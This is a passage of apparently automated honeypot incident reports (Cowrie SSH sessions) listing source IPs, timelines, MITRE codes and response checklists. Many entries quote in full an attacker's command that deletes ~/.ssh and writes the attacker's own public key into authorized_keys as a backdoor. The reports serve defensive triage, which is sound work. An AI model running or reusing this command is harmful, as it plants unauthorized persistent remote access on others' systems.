| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:21:51` | `cowrie.session.connect` |
| `2026-04-19 06:21:51` | `cowrie.client.version` |
| `2026-04-19 06:21:51` | `cowrie.client.kex` |
| `2026-04-19 06:21:51` | `cowrie.login.success` |
| `2026-04-19 06:21:51` | `cowrie.session.params` |
| `2026-04-19 06:21:51` | `cowrie.command.input` |
| `2026-04-19 06:21:51` | `cowrie.command.failed` |
| `2026-04-19 06:21:52` | `cowrie.log.closed` |
| `2026-04-19 06:21:52` | `cowrie.session.params` |
| `2026-04-19 06:21:52` | `cowrie.command.input` |
| `2026-04-19 06:21:52` | `cowrie.session.file_download` |
| `2026-04-19 06:21:52` | `cowrie.log.closed` |
| `2026-04-19 06:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5536bae1cf24

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:21 |
| **Last Seen** | 2026-04-19 06:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:21:54` | `cowrie.session.connect` |
| `2026-04-19 06:21:54` | `cowrie.client.version` |
| `2026-04-19 06:21:54` | `cowrie.client.kex` |
| `2026-04-19 06:21:55` | `cowrie.login.success` |
| `2026-04-19 06:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2976d363315

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:22 |
| **Last Seen** | 2026-04-19 06:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:22:14` | `cowrie.session.connect` |
| `2026-04-19 06:22:14` | `cowrie.client.version` |
| `2026-04-19 06:22:14` | `cowrie.client.kex` |
| `2026-04-19 06:22:14` | `cowrie.login.success` |
| `2026-04-19 06:22:15` | `cowrie.session.params` |
| `2026-04-19 06:22:15` | `cowrie.command.input` |
| `2026-04-19 06:22:15` | `cowrie.command.failed` |
| `2026-04-19 06:22:15` | `cowrie.log.closed` |
| `2026-04-19 06:22:15` | `cowrie.session.params` |
| `2026-04-19 06:22:15` | `cowrie.command.input` |
| `2026-04-19 06:22:15` | `cowrie.session.file_download` |
| `2026-04-19 06:22:15` | `cowrie.log.closed` |
| `2026-04-19 06:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-996d4cbd92ad

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:22 |
| **Last Seen** | 2026-04-19 06:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:22:17` | `cowrie.session.connect` |
| `2026-04-19 06:22:17` | `cowrie.client.version` |
| `2026-04-19 06:22:17` | `cowrie.client.kex` |
| `2026-04-19 06:22:18` | `cowrie.login.success` |
| `2026-04-19 06:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab13d93d6f54

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:22 |
| **Last Seen** | 2026-04-19 06:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:22:23` | `cowrie.session.connect` |
| `2026-04-19 06:22:23` | `cowrie.client.version` |
| `2026-04-19 06:22:23` | `cowrie.client.kex` |
| `2026-04-19 06:22:24` | `cowrie.login.success` |
| `2026-04-19 06:22:24` | `cowrie.session.params` |
| `2026-04-19 06:22:24` | `cowrie.command.input` |
| `2026-04-19 06:22:24` | `cowrie.command.failed` |
| `2026-04-19 06:22:24` | `cowrie.log.closed` |
| `2026-04-19 06:22:25` | `cowrie.session.params` |
| `2026-04-19 06:22:25` | `cowrie.command.input` |
| `2026-04-19 06:22:25` | `cowrie.session.file_download` |
| `2026-04-19 06:22:25` | `cowrie.log.closed` |
| `2026-04-19 06:22:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61c34c885cf1

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:22 |
| **Last Seen** | 2026-04-19 06:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:22:27` | `cowrie.session.connect` |
| `2026-04-19 06:22:27` | `cowrie.client.version` |
| `2026-04-19 06:22:27` | `cowrie.client.kex` |
| `2026-04-19 06:22:28` | `cowrie.login.success` |
| `2026-04-19 06:22:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30a808f8706a

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:23 |
| **Last Seen** | 2026-04-19 06:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:23:38` | `cowrie.session.connect` |
| `2026-04-19 06:23:38` | `cowrie.client.version` |
| `2026-04-19 06:23:38` | `cowrie.client.kex` |
| `2026-04-19 06:23:38` | `cowrie.login.success` |
| `2026-04-19 06:23:39` | `cowrie.session.params` |
| `2026-04-19 06:23:39` | `cowrie.command.input` |
| `2026-04-19 06:23:39` | `cowrie.command.failed` |
| `2026-04-19 06:23:39` | `cowrie.log.closed` |
| `2026-04-19 06:23:39` | `cowrie.session.params` |
| `2026-04-19 06:23:39` | `cowrie.command.input` |
| `2026-04-19 06:23:39` | `cowrie.session.file_download` |
| `2026-04-19 06:23:39` | `cowrie.log.closed` |
| `2026-04-19 06:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9c25d9847da

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:23 |
| **Last Seen** | 2026-04-19 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:23:41` | `cowrie.session.connect` |
| `2026-04-19 06:23:41` | `cowrie.client.version` |
| `2026-04-19 06:23:41` | `cowrie.client.kex` |
| `2026-04-19 06:23:42` | `cowrie.login.success` |
| `2026-04-19 06:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ca24de0180

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:24 |
| **Last Seen** | 2026-04-19 06:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:24:04` | `cowrie.session.connect` |
| `2026-04-19 06:24:04` | `cowrie.client.version` |
| `2026-04-19 06:24:05` | `cowrie.client.kex` |
| `2026-04-19 06:24:05` | `cowrie.login.success` |
| `2026-04-19 06:24:05` | `cowrie.session.params` |
| `2026-04-19 06:24:05` | `cowrie.command.input` |
| `2026-04-19 06:24:05` | `cowrie.command.failed` |
| `2026-04-19 06:24:05` | `cowrie.log.closed` |
| `2026-04-19 06:24:06` | `cowrie.session.params` |
| `2026-04-19 06:24:06` | `cowrie.command.input` |
| `2026-04-19 06:24:06` | `cowrie.session.file_download` |
| `2026-04-19 06:24:06` | `cowrie.log.closed` |
| `2026-04-19 06:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-497c2177f99d

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:24 |
| **Last Seen** | 2026-04-19 06:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:24:08` | `cowrie.session.connect` |
| `2026-04-19 06:24:08` | `cowrie.client.version` |
| `2026-04-19 06:24:08` | `cowrie.client.kex` |
| `2026-04-19 06:24:08` | `cowrie.login.success` |
| `2026-04-19 06:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e9ecd7d5646

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:27 |
| **Last Seen** | 2026-04-19 06:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:27:00` | `cowrie.session.connect` |
| `2026-04-19 06:27:00` | `cowrie.client.version` |
| `2026-04-19 06:27:00` | `cowrie.client.kex` |
| `2026-04-19 06:27:00` | `cowrie.login.success` |
| `2026-04-19 06:27:01` | `cowrie.session.params` |
| `2026-04-19 06:27:01` | `cowrie.command.input` |
| `2026-04-19 06:27:01` | `cowrie.command.failed` |
| `2026-04-19 06:27:01` | `cowrie.log.closed` |
| `2026-04-19 06:27:01` | `cowrie.session.params` |
| `2026-04-19 06:27:01` | `cowrie.command.input` |
| `2026-04-19 06:27:01` | `cowrie.session.file_download` |
| `2026-04-19 06:27:01` | `cowrie.log.closed` |
| `2026-04-19 06:27:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1a28867685e

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:27 |
| **Last Seen** | 2026-04-19 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:27:03` | `cowrie.session.connect` |
| `2026-04-19 06:27:03` | `cowrie.client.version` |
| `2026-04-19 06:27:04` | `cowrie.client.kex` |
| `2026-04-19 06:27:04` | `cowrie.login.success` |
| `2026-04-19 06:27:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8edff6b79f

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:28 |
| **Last Seen** | 2026-04-19 06:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:28:44` | `cowrie.session.connect` |
| `2026-04-19 06:28:44` | `cowrie.client.version` |
| `2026-04-19 06:28:44` | `cowrie.client.kex` |
| `2026-04-19 06:28:45` | `cowrie.login.success` |
| `2026-04-19 06:28:45` | `cowrie.session.params` |
| `2026-04-19 06:28:45` | `cowrie.command.input` |
| `2026-04-19 06:28:45` | `cowrie.command.failed` |
| `2026-04-19 06:28:46` | `cowrie.log.closed` |
| `2026-04-19 06:28:46` | `cowrie.session.params` |
| `2026-04-19 06:28:46` | `cowrie.command.input` |
| `2026-04-19 06:28:46` | `cowrie.session.file_download` |
| `2026-04-19 06:28:46` | `cowrie.log.closed` |
| `2026-04-19 06:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-614c72b362d6

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:28 |
| **Last Seen** | 2026-04-19 06:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:28:48` | `cowrie.session.connect` |
| `2026-04-19 06:28:48` | `cowrie.client.version` |
| `2026-04-19 06:28:48` | `cowrie.client.kex` |
| `2026-04-19 06:28:49` | `cowrie.login.success` |
| `2026-04-19 06:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-673a247a9548

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:29 |
| **Last Seen** | 2026-04-19 06:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:29:01` | `cowrie.session.connect` |
| `2026-04-19 06:29:01` | `cowrie.client.version` |
| `2026-04-19 06:29:01` | `cowrie.client.kex` |
| `2026-04-19 06:29:02` | `cowrie.login.success` |
| `2026-04-19 06:29:02` | `cowrie.session.params` |
| `2026-04-19 06:29:02` | `cowrie.command.input` |
| `2026-04-19 06:29:02` | `cowrie.command.failed` |
| `2026-04-19 06:29:02` | `cowrie.log.closed` |
| `2026-04-19 06:29:03` | `cowrie.session.params` |
| `2026-04-19 06:29:03` | `cowrie.command.input` |
| `2026-04-19 06:29:03` | `cowrie.session.file_download` |
| `2026-04-19 06:29:03` | `cowrie.log.closed` |
| `2026-04-19 06:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-812c908c6f9f

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:29 |
| **Last Seen** | 2026-04-19 06:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:29:05` | `cowrie.session.connect` |
| `2026-04-19 06:29:05` | `cowrie.client.version` |
| `2026-04-19 06:29:05` | `cowrie.client.kex` |
| `2026-04-19 06:29:05` | `cowrie.login.success` |
| `2026-04-19 06:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4552267a3ce

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:33 |
| **Last Seen** | 2026-04-19 06:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:33:47` | `cowrie.session.connect` |
| `2026-04-19 06:33:47` | `cowrie.client.version` |
| `2026-04-19 06:33:47` | `cowrie.client.kex` |
| `2026-04-19 06:33:47` | `cowrie.login.success` |
| `2026-04-19 06:33:48` | `cowrie.session.params` |
| `2026-04-19 06:33:48` | `cowrie.command.input` |
